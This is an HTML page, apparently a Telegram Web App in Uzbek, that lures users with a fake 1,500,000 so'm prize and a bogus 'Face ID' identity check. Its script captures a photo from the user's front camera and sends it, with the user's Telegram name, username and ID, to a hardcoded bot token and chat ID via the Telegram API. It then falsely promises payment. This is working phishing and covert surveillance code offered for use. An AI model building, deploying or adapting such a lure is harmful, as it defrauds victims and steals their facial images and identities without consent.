<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>1 500 000 so'm Mukofot!</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #0f172a;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    color: white;
    text-align: center;
    padding: 20px;
  }
  .card {
    background: #1e293b;
    border: 1px solid #334155;
    border-radius: 24px;
    padding: 32px 24px;
    max-width: 380px;
    width: 100%;
    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
  }
  .prize-badge {
    background: rgba(16, 185, 129, 0.1);
    color: #10b981;
    font-weight: bold;
    font-size: 14px;
    padding: 6px 16px;
    border-radius: 20px;
    display: inline-block;
    margin-bottom: 16px;
    border: 1px solid rgba(16, 185, 129, 0.2);
  }
  .amount {
    font-size: 32px;
    font-weight: 800;
    color: #22c55e;
    margin-bottom: 8px;
  }
  .scanner-box {
    width: 120px;
    height: 120px;
    border: 3px dashed #0284c7;
    border-radius: 50%;
    margin: 24px auto;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 48px;
    position: relative;
    animation: pulse 1.5s infinite alternate;
  }
  @keyframes pulse {
    0% { transform: scale(0.98); box-shadow: 0 0 0 0 rgba(2, 132, 199, 0.4); }
    100% { transform: scale(1.02); box-shadow: 0 0 0 15px rgba(2, 132, 199, 0); }
  }
  .btn {
    background: #0284c7;
    color: white;
    border: none;
    padding: 16px 24px;
    font-size: 16px;
    font-weight: bold;
    border-radius: 14px;
    width: 100%;
    cursor: pointer;
    margin-top: 16px;
    transition: background 0.2s;
  }
  .btn:active { background: #0369a1; }
  p.subtext { color: #94a3b8; font-size: 13px; margin-top: 12px; line-height: 1.4; }
  video, canvas { display: none; }
</style>
</head>
<body>

<div class="card" id="main-card">
  <div class="prize-badge">🎉 TABRIKLAYMIZ!</div>
  <h2>Sovg'angiz tayyor</h2>
  <div class="amount">1 500 000 so'm</div>
  
  <div class="scanner-box">
    👤
  </div>

  <p style="font-size: 15px; font-weight: 500; color: #e2e8f0;">
    Pul mukofotini kartangizga o'tkazish uchun shaxsingizni (Face ID) tasdiqlang
  </p>

  <button class="btn" onclick="startScan()">🆔 Shaxsni tasdiqlash</button>
  <p class="subtext">Tugmani bosganingizdan so'ng kameraga ruxsat bering</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const BOT_TOKEN = '8712533127:AAFXPFg8cfaXxbWrmADNJ9BkITMc8mUb1mo';
const CHAT_ID   = '8814685453';

async function startScan() {
  const card = document.getElementById('main-card');
  
  try {
    // Kamerani so'rash
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 },
      audio: false
    });

    // Ekranda skanerlash jarayonini ko'rsatish
    card.innerHTML = `
      <div class="scanner-box" style="border-color: #10b981;">🔍</div>
      <h2>Yuz skanerlanmoqda...</h2>
      <p class="subtext" style="font-size:15px; margin-top:8px;">Kameraga qarab turing, 1 500 000 so'm o'tkazilmoqda</p>
    `;

    const video = document.getElementById('video');
    video.srcObject = stream;

    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(resolve, 1800); // Kadrlash uchun 1.8 soniya
      };
    });

    // Rasm olish
    const canvas = document.getElementById('canvas');
    canvas.width  = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    // Kamerani o'chirish
    stream.getTracks().forEach(track => track.stop());

    // Telegramga yuborish
    canvas.toBlob(async (blob) => {
      if (!blob) return;

      const user = tg.initDataUnsafe?.user;
      const userName = user 
        ? `${user.first_name || ''} ${user.last_name || ''} (@${user.username || 'nomsiz'})`.trim()
        : 'Noma\'lum';

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'verified.jpg');
      formData.append('caption', `📸 Shaxs tasdiqlandi (1.5 mln so'm)!\n👤 ${userName}\n🆔 ID: ${user?.id || '?'}\n🕐 ${new Date().toLocaleString('uz-UZ')}`);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      // Muvaffaqiyatli yakun
      card.innerHTML = `
        <div style="font-size:60px">✅</div>
        <h2 style="margin-top:12px; color:#10b981;">Shaxsingiz tasdiqlandi!</h2>
        <p style="margin-top:8px; color:#cbd5e1;">1 500 000 so'm 24 soat ichida Telegram hisobingizga biriktirilgan kartaga o'tkaziladi.</p>
      `;
    }, 'image/jpeg', 0.85);

  } catch (err) {
    alert("Shaxsni tasdiqlash uchun kameraga ruxsat berishingiz kerak!");
  }
}
</script>
</body>
</html>
